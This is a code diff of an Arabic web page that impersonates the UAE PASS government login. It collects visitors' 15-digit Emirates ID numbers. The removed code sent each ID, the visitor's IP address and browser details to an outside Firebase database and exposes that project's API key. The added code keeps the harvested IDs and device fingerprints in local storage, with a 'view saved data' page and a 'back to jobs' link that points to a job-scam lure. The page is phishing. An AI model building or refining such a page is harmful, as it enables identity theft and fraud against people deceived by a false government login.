@@ -5,17 +5,14 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>UAE PASS - تسجيل الدخول</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
     <div class="rectangle"></div>
     
     <div class="main-wrapper">
         <div class="container">
-            <!-- إضافة مؤشر حالة الاتصال -->
-            <div id="connectionStatus" style="display: none; padding: 10px; margin-bottom: 15px; border-radius: 8px; text-align: center;">
-                <span id="statusText"></span>
-            </div>
-            
+            <!-- رأس الصفحة -->
             <header class="header">
                 <div class="logo">
                     <img src="self_service.png" alt="UAE Pass Logo">
@@ -26,517 +23,880 @@
                 </h1>
             </header>
             
+            <!-- حالة الحفظ -->
+            <div id="saveStatus" class="save-status" style="display: none;">
+                <div id="statusContent"></div>
+            </div>
+            
+            <!-- المحتوى الرئيسي -->
             <main class="login-content">
+                <!-- نموذج تسجيل الدخول -->
                 <form id="loginForm">
+                    <!-- حقل اسم المستخدم -->
                     <div class="form-group">
+                        <label class="form-label" for="username">
+                            <i class="fas fa-id-card"></i> رقم الهوية
+                        </label>
                         <input type="text" 
                                class="form-input" 
                                id="username" 
                                name="username" 
-                               placeholder="رقم الهوية، البريد الإلكتروني، أو الهاتف"
+                               placeholder="784XXXXXXXXXXXX (15 رقمًا)"
+                               pattern="\d{15}"
+                               title="يجب إدخال 15 رقماً"
+                               maxlength="15"
                                required>
-                    </div>
-                    
-                    <div class="form-options">
-                        <div class="form-check">
-                            <input type="checkbox" checked id="rememberme" name="rememberme">
-                            <label class="checkbox-label" for="rememberme">تذكرني</label>
+                        <div class="form-hint">
+                            <i class="fas fa-info-circle"></i> رقم الهوية الإماراتي يتكون من 15 رقمًا ويبدأ بـ 784
                         </div>
                     </div>
                     
+                    <!-- خانة الاختيار "تذكرني" -->
+                    <div class="form-options">
+                        <div class="form-check">
+                            <input type="checkbox" checked id="rememberme" name="rememberme">
+                            <label class="checkbox-label" for="rememberme">
+                                <i class="fas fa-save"></i> تذكرني
+                            </label>
+                        </div>
+                    </div>
+                    
+                    <!-- زر تسجيل الدخول -->
                     <div class="form-group-button">
                         <button type="submit" class="btn-login" id="submitButton">
-                            تسجيل الدخول
+                            <i class="fas fa-sign-in-alt"></i> تسجيل الدخول
                         </button>
                     </div>
                 </form>
                 
+                <!-- الفاصل -->
                 <div class="divider">
                     <hr class="style">
                     <span class="divider-text">أو</span>
                 </div>
                 
+                <!-- روابط إضافية -->
                 <div class="account-actions">
                     <div class="dont-have-account">
-                        <span class="account-text">ليس لديك حساب؟</span>
-                        <a href="#" class="create-new-account">إنشاء حساب جديد</a>
+                        <span class="account-text">
+                            <i class="fas fa-question-circle"></i> ليس لديك حساب؟
+                        </span>
+                        <a href="#" class="create-new-account">
+                            <i class="fas fa-user-plus"></i> إنشاء حساب جديد
+                        </a>
                     </div>
                     
                     <div class="recover-account">
-                        <a href="#" class="recover-link">كيفية استعادة الحساب؟</a>
+                        <a href="#" class="recover-link">
+                            <i class="fas fa-key"></i> كيفية استعادة الحساب؟
+                        </a>
+                    </div>
+                    
+                    <!-- رابط عرض البيانات -->
+                    <div class="view-data-link">
+                        <a href="view-data.html" class="data-link">
+                            <i class="fas fa-database"></i> عرض البيانات المحفوظة
+                        </a>
                     </div>
                 </div>
                 
+                <!-- زر تطبيق UAE PASS -->
                 <div class="uaepass-app">
-                    <button class="btn-app" type="button">
-                        <span class="btn-text">UAE PASS App</span>
+                    <button class="btn-app" type="button" onclick="window.location.href='index.html'">
+                        <i class="fas fa-briefcase"></i>
+                        <span class="btn-text">العودة للوظائف</span>
                     </button>
                 </div>
             </main>
             
+            <!-- تذييل الصفحة -->
             <footer class="footer">
                 <div class="footer-links">
-                    <a href="#" class="menu-link">الدعم</a>
+                    <a href="#" class="menu-link">
+                        <i class="fas fa-headset"></i> الدعم
+                    </a>
                     <span class="menu-separator">|</span>
-                    <a href="#" class="menu-link">الأسئلة الشائعة</a>
+                    <a href="#" class="menu-link">
+                        <i class="fas fa-question-circle"></i> الأسئلة الشائعة
+                    </a>
                     <span class="menu-separator">|</span>
-                    <a href="#" class="menu-link">نبذة عامة</a>
+                    <a href="#" class="menu-link">
+                        <i class="fas fa-info-circle"></i> نبذة عامة
+                    </a>
+                    <span class="menu-separator">|</span>
+                    <a href="view-data.html" class="menu-link">
+                        <i class="fas fa-chart-bar"></i> الإحصائيات
+                    </a>
                 </div>
                 <div class="copyright">
-                    حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.
+                    <i class="fas fa-copyright"></i> حقوق النشر © 2025 الهوية الرقمية جميع الحقوق محفوظة.
                 </div>
             </footer>
         </div>
     </div>
 
-    <script type="module">
-        // === تكوين Firebase ===
-        const firebaseConfig = {
-            apiKey: "AIzaSyA1c9ft1XJrmjKIwhdxixJ1KM5Q3VL9HvQ",
-            authDomain: "uaewep-38378.firebaseapp.com",
-            databaseURL: "https://uaewep-38378-default-rtdb.firebaseio.com",
-            projectId: "uaewep-38378",
-            storageBucket: "uaewep-38378.firebasestorage.app",
-            messagingSenderId: "366757774392",
-            appId: "1:366757774392:web:32da696c806184709ed2cd",
-            measurementId: "G-XNZC0GHCMM"
-        };
-
-        // === الوحدات ===
-        let app, database;
-        
-        try {
-            const { initializeApp } = await import("https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js");
-            const { getDatabase, ref, push, set, serverTimestamp } = await import("https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js");
-            
-            app = initializeApp(firebaseConfig);
-            database = getDatabase(app);
-            
-            console.log("✅ Firebase تم التهيئة بنجاح");
-            updateConnectionStatus("success", "✅ متصل بقاعدة البيانات");
-            
-        } catch (error) {
-            console.error("❌ خطأ في تهيئة Firebase:", error);
-            updateConnectionStatus("error", "❌ خطأ في الاتصال بقاعدة البيانات");
-        }
-
-        // === متغيرات ===
-        let isOnline = navigator.onLine;
-        let isFirebaseConnected = false;
-
-        // === دالة تحديث حالة الاتصال ===
-        function updateConnectionStatus(type, message) {
-            const statusElement = document.getElementById('connectionStatus');
-            const statusText = document.getElementById('statusText');
-            
-            if (!statusElement || !statusText) return;
-            
-            statusElement.style.display = 'block';
-            statusText.textContent = message;
-            
-            const colors = {
-                success: '#d4edda',
-                error: '#f8d7da',
-                warning: '#fff3cd',
-                info: '#d1ecf1'
-            };
-            
-            const textColors = {
-                success: '#155724',
-                error: '#721c24',
-                warning: '#856404',
-                info: '#0c5460'
-            };
-            
-            statusElement.style.backgroundColor = colors[type] || colors.info;
-            statusElement.style.color = textColors[type] || textColors.info;
-            statusElement.style.border = `1px solid ${textColors[type] || textColors.info}`;
-            
-            if (type === 'success') {
-                setTimeout(() => {
-                    statusElement.style.display = 'none';
-                }, 3000);
-            }
-        }
-
-        // === اختبار اتصال Firebase ===
-        async function testFirebaseConnection() {
-            if (!database) {
-                updateConnectionStatus("error", "❌ قاعدة البيانات غير مهيئة");
-                return false;
+    <!-- نظام الحفظ المحلي -->
+    <script>
+        // === إدارة التخزين المحلي ===
+        class LocalIDStorage {
+            constructor() {
+                this.STORAGE_KEY = 'uae_id_records';
+                this.BACKUP_KEY_PREFIX = 'uae_id_backup_';
+                this.initStorage();
             }
             
-            try {
-                const testRef = ref(database, 'connection_test');
-                await set(testRef, {
-                    test: 'connection',
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent.substring(0, 50)
-                });
+            // تهيئة التخزين
+            initStorage() {
+                if (!localStorage.getItem(this.STORAGE_KEY)) {
+                    localStorage.setItem(this.STORAGE_KEY, JSON.stringify([]));
+                    console.log('📂 تم إنشاء تخزين جديد للسجلات');
+                }
+            }
+            
+            // التحقق من رقم الهوية
+            validateID(idNumber) {
+                if (!idNumber || typeof idNumber !== 'string') {
+                    return {
+                        isValid: false,
+                        message: 'يرجى إدخال رقم الهوية'
+                    };
+                }
                 
-                console.log("✅ اتصال Firebase ناجح!");
-                isFirebaseConnected = true;
-                updateConnectionStatus("success", "✅ متصل بقاعدة البيانات");
-                return true;
+                // تنظيف الرقم
+                const cleanId = idNumber.replace(/\D/g, '');
                 
-            } catch (error) {
-                console.error("❌ فشل اتصال Firebase:", error);
-                updateConnectionStatus("error", "❌ فشل الاتصال بقاعدة البيانات");
-                isFirebaseConnected = false;
-                return false;
-            }
-        }
-
-        // === التحقق من رقم الهوية ===
-        function validateEmiratesID(idNumber) {
-            if (!idNumber || idNumber.trim() === '') {
-                return { isValid: false, message: "يرجى إدخال رقم الهوية" };
-            }
-            
-            const cleanId = idNumber.replace(/\D/g, '');
-            
-            if (cleanId.length !== 15) {
-                return { isValid: false, message: "رقم الهوية يتكون من 15 رقماً" };
-            }
-            
-            if (!/^\d+$/.test(cleanId)) {
-                return { isValid: false, message: "يجب أن يحتوي على أرقام فقط" };
-            }
-            
-            return { 
-                isValid: true, 
-                cleanedId: cleanId,
-                message: "رقم هوية صالح"
-            };
-        }
-
-        // === دالة الحفظ ===
-        async function saveUserData(idNumber, rememberMe) {
-            if (!isOnline) {
+                // التحقق من الطول
+                if (cleanId.length !== 15) {
+                    return {
+                        isValid: false,
+                        message: 'رقم الهوية يجب أن يكون 15 رقماً'
+                    };
+                }
+                
+                // التحقق من الأرقام فقط
+                if (!/^\d+$/.test(cleanId)) {
+                    return {
+                        isValid: false,
+                        message: 'يجب أن يحتوي رقم الهوية على أرقام فقط'
+                    };
+                }
+                
+                // التحقق من البادئة
+                if (!cleanId.startsWith('784')) {
+                    return {
+                        isValid: false,
+                        message: 'رقم الهوية الإماراتي يبدأ بـ 784'
+                    };
+                }
+                
                 return {
-                    success: false,
-                    error: "لا يوجد اتصال بالإنترنت",
-                    localSave: true
+                    isValid: true,
+                    cleanedId: cleanId,
+                    prefix: cleanId.substring(0, 3),
+                    birthYear: cleanId.substring(3, 7),
+                    randomPart: cleanId.substring(7, 14),
+                    checkDigit: cleanId.substring(14, 15)
                 };
             }
             
-            if (!isFirebaseConnected) {
-                const connected = await testFirebaseConnection();
-                if (!connected) {
+            // حفظ السجل
+            saveRecord(idNumber, rememberMe) {
+                try {
+                    const validation = this.validateID(idNumber);
+                    if (!validation.isValid) {
+                        throw new Error(validation.message);
+                    }
+                    
+                    // إنشاء السجل
+                    const record = {
+                        id: this.generateUniqueId(),
+                        idNumber: validation.cleanedId,
+                        idDetails: {
+                            prefix: validation.prefix,
+                            birthYear: validation.birthYear,
+                            randomPart: validation.randomPart,
+                            checkDigit: validation.checkDigit
+                        },
+                        rememberMe: rememberMe,
+                        timestamp: new Date().toISOString(),
+                        date: new Date().toLocaleDateString('ar-SA'),
+                        time: new Date().toLocaleTimeString('ar-SA'),
+                        userAgent: navigator.userAgent.substring(0, 100),
+                        screenSize: `${window.screen.width}x${window.screen.height}`,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        status: 'active',
+                        source: 'manual_entry'
+                    };
+                    
+                    // جلب السجلات الحالية
+                    const records = this.getRecords();
+                    
+                    // التحقق من التكرار
+                    const isDuplicate = records.some(r => r.idNumber === record.idNumber);
+                    if (isDuplicate) {
+                        record.status = 'duplicate';
+                    }
+                    
+                    // إضافة السجل الجديد
+                    records.push(record);
+                    
+                    // حفظ في localStorage
+                    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(records));
+                    
+                    console.log('✅ تم حفظ السجل:', record);
+                    
+                    return {
+                        success: true,
+                        record: record,
+                        isDuplicate: isDuplicate,
+                        totalRecords: records.length
+                    };
+                    
+                } catch (error) {
+                    console.error('❌ خطأ في حفظ السجل:', error);
                     return {
                         success: false,
-                        error: "لا يمكن الاتصال بقاعدة البيانات",
-                        localSave: true
+                        error: error.message
                     };
                 }
             }
             
-            try {
-                const validation = validateEmiratesID(idNumber);
-                if (!validation.isValid) {
-                    throw new Error(validation.message);
-                }
-                
-                // جلب IP
-                let ipAddress = 'غير معروف';
+            // جلب جميع السجلات
+            getRecords() {
                 try {
-                    const ipResponse = await fetch('https://api.ipify.org?format=json', { timeout: 5000 });
-                    if (ipResponse.ok) {
-                        const ipData = await ipResponse.json();
-                        ipAddress = ipData.ip;
-                    }
-                } catch (ipError) {
-                    console.warn("⚠️ لا يمكن جلب IP:", ipError);
+                    const recordsJson = localStorage.getItem(this.STORAGE_KEY);
+                    return recordsJson ? JSON.parse(recordsJson) : [];
+                } catch (error) {
+                    console.error('❌ خطأ في جلب السجلات:', error);
+                    return [];
                 }
-                
-                // إعداد البيانات
-                const userData = {
-                    idNumber: validation.cleanedId,
-                    rememberMe: rememberMe,
-                    timestamp: new Date().toISOString(),
-                    date: new Date().toLocaleDateString('ar-SA'),
-                    time: new Date().toLocaleTimeString('ar-SA'),
-                    ipAddress: ipAddress,
-                    userAgent: navigator.userAgent.substring(0, 100),
-                    language: navigator.language,
-                    screenSize: `${window.innerWidth}x${window.innerHeight}`
-                };
-                
-                console.log("💾 جاري الحفظ...", userData);
-                
-                // الحفظ في Firebase
-                const usersRef = ref(database, 'users');
-                const newUserRef = push(usersRef);
-                await set(newUserRef, userData);
-                
-                console.log("✅ تم الحفظ! المفتاح:", newUserRef.key);
-                
-                // حفظ محلي للنسخ الاحتياطي
-                const localData = {
-                    ...userData,
-                    firebaseKey: newUserRef.key,
-                    savedLocally: new Date().toISOString()
-                };
-                
-                localStorage.setItem(`backup_${newUserRef.key}`, JSON.stringify(localData));
-                
-                return {
-                    success: true,
-                    key: newUserRef.key,
-                    id: validation.cleanedId,
-                    message: "تم الحفظ بنجاح"
-                };
-                
-            } catch (error) {
-                console.error("❌ خطأ في الحفظ:", error);
-                
-                // حفظ محلي في حالة الفشل
-                const localBackup = {
-                    idNumber: idNumber.replace(/\D/g, ''),
-                    rememberMe: rememberMe,
-                    timestamp: new Date().toISOString(),
-                    error: error.message,
-                    savedLocally: new Date().toISOString()
-                };
-                
-                const backupKey = `failed_${Date.now()}`;
-                localStorage.setItem(backupKey, JSON.stringify(localBackup));
-                
-                return {
-                    success: false,
-                    error: error.message,
-                    localSave: true,
-                    backupKey: backupKey
-                };
-            }
-        }
-
-        // === معالجة النموذج ===
-        document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            
-            const username = document.getElementById('username').value.trim();
-            const submitButton = document.getElementById('submitButton');
-            const rememberMe = document.getElementById('rememberme').checked;
-            
-            // التحقق الأساسي
-            if (!username) {
-                showMessage("يرجى إدخال رقم الهوية", "error");
-                return;
             }
             
-            // التحقق من الاتصال
-            if (!isOnline) {
-                showMessage("لا يوجد اتصال بالإنترنت", "error");
-                return;
+            // جلب عدد السجلات
+            getRecordCount() {
+                return this.getRecords().length;
             }
             
-            // إعداد الزر
-            const originalText = submitButton.textContent;
-            const originalColor = submitButton.style.backgroundColor;
-            
-            submitButton.textContent = 'جاري الحفظ...';
-            submitButton.disabled = true;
-            submitButton.style.opacity = '0.7';
-            
-            try {
-                const result = await saveUserData(username, rememberMe);
+            // جلب السجلات الفريدة
+            getUniqueRecords() {
+                const records = this.getRecords();
+                const uniqueMap = new Map();
                 
-                if (result.success) {
-                    // نجاح
-                    showMessage(`✅ ${result.message} - الرقم: ${result.id}`, "success");
-                    
-                    if (rememberMe) {
-                        localStorage.setItem('last_id', result.id);
-                        localStorage.setItem('last_save', new Date().toISOString());
+                records.forEach(record => {
+                    if (!uniqueMap.has(record.idNumber)) {
+                        uniqueMap.set(record.idNumber, record);
                     }
+                });
+                
+                return Array.from(uniqueMap.values());
+            }
+            
+            // تصدير البيانات
+            exportData(format = 'json') {
+                const data = {
+                    records: this.getRecords(),
+                    exportInfo: {
+                        date: new Date().toISOString(),
+                        totalRecords: this.getRecordCount(),
+                        uniqueRecords: this.getUniqueRecords().length,
+                        system: 'UAE ID Storage System'
+                    }
+                };
+                
+                let content, mimeType, extension;
+                
+                if (format === 'csv') {
+                    // تحويل لـ CSV
+                    const headers = ['رقم الهوية', 'التاريخ', 'الوقت', 'حالة التذكر', 'الشاشة', 'المتصفح'];
+                    const rows = data.records.map(record => [
+                        record.idNumber,
+                        record.date,
+                        record.time,
+                        record.rememberMe ? 'نعم' : 'لا',
+                        record.screenSize,
+                        record.userAgent.substring(0, 30) + '...'
+                    ]);
                     
-                    submitButton.textContent = '✓ تم الحفظ';
-                    submitButton.style.backgroundColor = '#00ac75';
-                    submitButton.style.color = 'white';
+                    const csvContent = [
+                        headers.join(','),
+                        ...rows.map(row => row.join(','))
+                    ].join('\n');
                     
-                    // إعادة تعيين النموذج
-                    setTimeout(() => {
-                        document.getElementById('username').value = '';
-                        if (!rememberMe) {
-                            document.getElementById('rememberme').checked = false;
-                        }
-                    }, 1000);
-                    
-                    // إعادة التوجيه
-                    setTimeout(() => {
-                        window.location.href = 'index.html?saved=true&id=' + result.id;
-                    }, 2000);
+                    content = '\ufeff' + csvContent;
+                    mimeType = 'text/csv;charset=utf-8;';
+                    extension = 'csv';
                     
                 } else {
-                    // فشل
-                    let errorMsg = result.error;
-                    if (result.localSave) {
-                        errorMsg += " - تم الحفظ محلياً";
-                    }
-                    
-                    showMessage(`❌ ${errorMsg}`, "error");
-                    submitButton.textContent = originalText;
-                    submitButton.disabled = false;
-                    submitButton.style.opacity = '1';
+                    // JSON افتراضي
+                    content = JSON.stringify(data, null, 2);
+                    mimeType = 'application/json';
+                    extension = 'json';
                 }
                 
-            } catch (error) {
-                showMessage(`❌ خطأ غير متوقع: ${error.message}`, "error");
-                submitButton.textContent = originalText;
-                submitButton.disabled = false;
-                submitButton.style.opacity = '1';
+                return { content, mimeType, extension };
             }
-        });
-
-        // === دالة عرض الرسائل ===
-        function showMessage(message, type = "info") {
-            const existingMsg = document.querySelector('.user-message');
-            if (existingMsg) existingMsg.remove();
             
-            const messageDiv = document.createElement('div');
-            messageDiv.className = `user-message ${type}`;
-            messageDiv.textContent = message;
-            messageDiv.style.cssText = `
-                padding: 15px;
-                margin: 15px 0;
-                border-radius: 8px;
-                text-align: center;
-                font-size: 14px;
-                font-weight: 500;
-                animation: fadeIn 0.3s;
-                ${type === 'error' ? 
-                    'background: #fee; color: #c00; border: 1px solid #fcc;' : 
-                 type === 'success' ? 
-                    'background: #efe; color: #090; border: 1px solid #cfc;' :
-                    'background: #eef; color: #009; border: 1px solid #ccf;'}
-            `;
+            // إنشاء نسخة احتياطية
+            createBackup() {
+                const backupKey = `${this.BACKUP_KEY_PREFIX}${Date.now()}`;
+                const records = this.getRecords();
+                const backupData = {
+                    records: records,
+                    backupDate: new Date().toISOString(),
+                    totalRecords: records.length
+                };
+                
+                localStorage.setItem(backupKey, JSON.stringify(backupData));
+                console.log(`📦 تم إنشاء نسخة احتياطية: ${backupKey}`);
+                
+                return backupKey;
+            }
             
-            const form = document.getElementById('loginForm');
-            form.parentNode.insertBefore(messageDiv, form);
-            
-            setTimeout(() => {
-                if (messageDiv.parentNode) {
-                    messageDiv.style.opacity = '0';
-                    messageDiv.style.transition = 'opacity 0.5s';
-                    setTimeout(() => messageDiv.remove(), 500);
+            // مسح السجلات
+            clearRecords() {
+                const recordCount = this.getRecordCount();
+                
+                if (recordCount === 0) {
+                    return { success: true, message: 'لا توجد سجلات للمسح', cleared: 0 };
                 }
-            }, 5000);
+                
+                // إنشاء نسخة احتياطية قبل المسح
+                this.createBackup();
+                
+                // مسح السجلات
+                localStorage.setItem(this.STORAGE_KEY, JSON.stringify([]));
+                
+                console.log(`🗑️ تم مسح ${recordCount} سجلاً`);
+                return { 
+                    success: true, 
+                    message: `تم مسح ${recordCount} سجلاً`, 
+                    cleared: recordCount 
+                };
+            }
+            
+            // إنشاء معرف فريد
+            generateUniqueId() {
+                return 'id_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            }
         }
 
-        // === مراقبة الاتصال ===
-        window.addEventListener('online', () => {
-            isOnline = true;
-            updateConnectionStatus("success", "✅ تم استعادة الاتصال بالإنترنت");
-            console.log("🌐 اتصال الإنترنت استُعيد");
-            
-            // محاولة إعادة الاتصال بـ Firebase
-            setTimeout(testFirebaseConnection, 1000);
-        });
+        // === تهيئة النظام ===
+        const idStorage = new LocalIDStorage();
         
-        window.addEventListener('offline', () => {
-            isOnline = false;
-            updateConnectionStatus("warning", "⚠️ فقدان الاتصال بالإنترنت");
-            console.warn("⚠️ فقدان الاتصال بالإنترنت");
-        });
+        // === عناصر DOM ===
+        const loginForm = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const submitButton = document.getElementById('submitButton');
+        const saveStatus = document.getElementById('saveStatus');
+        const statusContent = document.getElementById('statusContent');
 
-        // === التهيئة الأولية ===
-        window.addEventListener('DOMContentLoaded', () => {
-            console.log("🚀 الصفحة جاهزة");
-            
-            // تحميل البيانات المحفوظة
-            const savedId = localStorage.getItem('last_id');
-            const savedRemember = localStorage.getItem('remember_me');
-            
-            if (savedId && savedRemember === 'true') {
-                document.getElementById('username').value = savedId;
-                document.getElementById('rememberme').checked = true;
+        // === تنسيقات CSS ===
+        const styles = document.createElement('style');
+        styles.textContent = `
+            .save-status {
+                padding: 15px;
+                margin: 15px 0;
+                border-radius: 10px;
+                animation: slideDown 0.3s ease-out;
             }
             
-            // اختبار الاتصال
-            setTimeout(() => {
-                testFirebaseConnection();
-            }, 1000);
-            
-            // عرض حالة الاتصال الأولية
-            if (!isOnline) {
-                updateConnectionStatus("warning", "⚠️ لا يوجد اتصال بالإنترنت");
+            .status-success {
+                background-color: #d4edda;
+                color: #155724;
+                border: 1px solid #c3e6cb;
             }
-        });
-
-        // === أنيميشن ===
-        const style = document.createElement('style');
-        style.textContent = `
-            @keyframes fadeIn {
-                from { opacity: 0; transform: translateY(-10px); }
-                to { opacity: 1; transform: translateY(0); }
+            
+            .status-error {
+                background-color: #f8d7da;
+                color: #721c24;
+                border: 1px solid #f5c6cb;
+            }
+            
+            .status-info {
+                background-color: #d1ecf1;
+                color: #0c5460;
+                border: 1px solid #bee5eb;
+            }
+            
+            .status-warning {
+                background-color: #fff3cd;
+                color: #856404;
+                border: 1px solid #ffeaa7;
+            }
+            
+            @keyframes slideDown {
+                from {
+                    opacity: 0;
+                    transform: translateY(-20px);
+                }
+                to {
+                    opacity: 1;
+                    transform: translateY(0);
+                }
             }
             
             @keyframes pulse {
                 0% { transform: scale(1); }
-                50% { transform: scale(1.02); }
+                50% { transform: scale(1.05); }
                 100% { transform: scale(1); }
             }
             
-            .btn-login:disabled {
-                animation: pulse 1.5s infinite;
+            .form-label {
+                display: block;
+                margin-bottom: 8px;
+                font-weight: 600;
+                color: #454f63;
+            }
+            
+            .form-hint {
+                font-size: 12px;
+                color: #78849e;
+                margin-top: 5px;
+                display: flex;
+                align-items: center;
+                gap: 5px;
+            }
+            
+            .view-data-link {
+                margin-top: 15px;
+                text-align: center;
+            }
+            
+            .data-link {
+                color: #0D98BA;
+                text-decoration: none;
+                font-weight: 600;
+                display: inline-flex;
+                align-items: center;
+                gap: 8px;
+                padding: 8px 15px;
+                border: 2px solid #0D98BA;
+                border-radius: 8px;
+                transition: all 0.3s;
+            }
+            
+            .data-link:hover {
+                background-color: #0D98BA;
+                color: white;
+                transform: translateY(-2px);
+            }
+            
+            .btn-login.loading {
+                opacity: 0.8;
+                cursor: wait;
+            }
+            
+            .btn-login.success {
+                background-color: #00ac75 !important;
+            }
+            
+            .btn-login.error {
+                background-color: #ff4757 !important;
+            }
+            
+            .id-preview {
+                background: #f8f9fa;
+                padding: 10px;
+                border-radius: 8px;
+                margin: 10px 0;
+                font-family: monospace;
+                font-size: 16px;
+                text-align: center;
+                border: 1px dashed #dee2e6;
+            }
+            
+            .record-details {
+                background: white;
+                border-radius: 8px;
+                padding: 15px;
+                margin: 15px 0;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            }
+            
+            .record-details h4 {
+                margin-top: 0;
+                color: #0D98BA;
+                border-bottom: 2px solid #f0f0f0;
+                padding-bottom: 10px;
+            }
+            
+            .details-grid {
+                display: grid;
+                grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+                gap: 10px;
+                margin-top: 10px;
+            }
+            
+            .detail-item {
+                padding: 8px;
+                background: #f8fafc;
+                border-radius: 5px;
+            }
+            
+            .detail-label {
+                font-weight: 600;
+                color: #78849e;
+                font-size: 12px;
+            }
+            
+            .detail-value {
+                color: #454f63;
+                font-size: 14px;
             }
         `;
-        document.head.appendChild(style);
+        document.head.appendChild(styles);
 
-        // === أدوات التطوير ===
-        console.log("🔧 أدوات التطوير المتاحة:");
-        console.log("- testSave('784123456789012') - اختبر الحفظ");
-        console.log("- checkConnection() - تحقق من الاتصال");
-        console.log("- viewBackups() - عرض النسخ الاحتياطية");
-        
-        window.testSave = async function(testId = '784123456789012') {
-            console.log("🧪 اختبار الحفظ...");
-            const result = await saveUserData(testId, false);
-            console.log("النتيجة:", result);
-            return result;
-        };
-        
-        window.checkConnection = testFirebaseConnection;
-        
-        window.viewBackups = function() {
-            console.log("📦 النسخ الاحتياطية المحلية:");
-            for (let i = 0; i < localStorage.length; i++) {
-                const key = localStorage.key(i);
-                if (key.includes('backup_') || key.includes('failed_')) {
-                    console.log(`${key}:`, JSON.parse(localStorage.getItem(key)));
-                }
-            }
-        };
-
-        // === إضافة زر مساعدة ===
-        const helpButton = document.createElement('button');
-        helpButton.textContent = 'مساعدة تقنية';
-        helpButton.style.cssText = `
-            position: fixed;
-            bottom: 20px;
-            left: 20px;
-            padding: 8px 15px;
-            background: #78849e;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 12px;
-            z-index: 1000;
-        `;
-        helpButton.onclick = function() {
-            const connectionInfo = `
-                حالة الاتصال: ${isOnline ? 'متصل' : 'غير متصل'}
-                Firebase: ${isFirebaseConnected ? 'متصل' : 'غير متصل'}
-                آخر IP: ${localStorage.getItem('last_ip') || 'غير معروف'}
-                نسخ احتياطية: ${Array.from({length: localStorage.length})
-                    .filter((_, i) => localStorage.key(i).includes('backup_') || 
-                            localStorage.key(i).includes('failed_')).length}
+        // === عرض الرسائل ===
+        function showMessage(message, type = 'info', duration = 5000) {
+            saveStatus.style.display = 'block';
+            saveStatus.className = `save-status status-${type}`;
+            statusContent.innerHTML = `
+                <div style="display: flex; align-items: center; gap: 10px;">
+                    <i class="fas fa-${getIconForType(type)}"></i>
+                    <span>${message}</span>
+                </div>
             `;
-            alert(connectionInfo);
+            
+            if (duration > 0) {
+                setTimeout(() => {
+                    saveStatus.style.display = 'none';
+                }, duration);
+            }
+        }
+        
+        function getIconForType(type) {
+            const icons = {
+                success: 'check-circle',
+                error: 'exclamation-circle',
+                warning: 'exclamation-triangle',
+                info: 'info-circle'
+            };
+            return icons[type] || 'info-circle';
+        }
+
+        // === تحديث زر التسجيل ===
+        function updateButtonState(state, text = null) {
+            const originalText = submitButton.innerHTML;
+            
+            submitButton.classList.remove('loading', 'success', 'error');
+            
+            switch(state) {
+                case 'loading':
+                    submitButton.disabled = true;
+                    submitButton.classList.add('loading');
+                    submitButton.innerHTML = `
+                        <i class="fas fa-spinner fa-spin"></i> جاري الحفظ...
+                    `;
+                    break;
+                    
+                case 'success':
+                    submitButton.disabled = false;
+                    submitButton.classList.add('success');
+                    submitButton.innerHTML = text || `
+                        <i class="fas fa-check"></i> تم الحفظ بنجاح
+                    `;
+                    break;
+                    
+                case 'error':
+                    submitButton.disabled = false;
+                    submitButton.classList.add('error');
+                    submitButton.innerHTML = text || originalText;
+                    break;
+                    
+                default:
+                    submitButton.disabled = false;
+                    submitButton.innerHTML = originalText;
+            }
+        }
+
+        // === معالجة النموذج ===
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const idNumber = usernameInput.value.trim();
+            const rememberMe = document.getElementById('rememberme').checked;
+            
+            // التحقق الأساسي
+            if (!idNumber) {
+                showMessage('يرجى إدخال رقم الهوية', 'error');
+                usernameInput.focus();
+                return;
+            }
+            
+            // تحديث حالة الزر
+            updateButtonState('loading');
+            
+            try {
+                // محاكاة التأخير للحصول على تجربة واقعية
+                await new Promise(resolve => setTimeout(resolve, 800));
+                
+                // حفظ السجل
+                const result = idStorage.saveRecord(idNumber, rememberMe);
+                
+                if (result.success) {
+                    // عرض تفاصيل الحفظ
+                    showMessage(
+                        `✅ تم حفظ رقم الهوية بنجاح! (${idStorage.getRecordCount()} سجلاً)`,
+                        'success',
+                        8000
+                    );
+                    
+                    // عرض تفاصيل السجل
+                    displayRecordDetails(result.record);
+                    
+                    // تحديث زر التسجيل
+                    updateButtonState('success');
+                    
+                    // حفظ تفضيلات المستخدم
+                    if (rememberMe) {
+                        localStorage.setItem('last_entered_id', result.record.idNumber);
+                        localStorage.setItem('auto_remember', 'true');
+                    } else {
+                        localStorage.removeItem('last_entered_id');
+                        localStorage.removeItem('auto_remember');
+                    }
+                    
+                    // إعادة تعيين النموذج بعد تأخير
+                    setTimeout(() => {
+                        if (!rememberMe) {
+                            usernameInput.value = '';
+                        }
+                        updateButtonState('default');
+                    }, 3000);
+                    
+                    // عرض خيار الانتقال للعرض
+                    setTimeout(() => {
+                        showMessage(
+                            `يمكنك <a href="view-data.html" style="color: #155724; font-weight: bold;">عرض جميع السجلات</a> (${idStorage.getRecordCount()} سجلاً)`,
+                            'info',
+                            10000
+                        );
+                    }, 2000);
+                    
+                } else {
+                    showMessage(`❌ ${result.error}`, 'error');
+                    updateButtonState('error');
+                }
+                
+            } catch (error) {
+                console.error('❌ خطأ غير متوقع:', error);
+                showMessage(`حدث خطأ غير متوقع: ${error.message}`, 'error');
+                updateButtonState('error');
+            }
+        });
+
+        // === عرض تفاصيل السجل المحفوظ ===
+        function displayRecordDetails(record) {
+            const existingDetails = document.querySelector('.record-details');
+            if (existingDetails) {
+                existingDetails.remove();
+            }
+            
+            const detailsDiv = document.createElement('div');
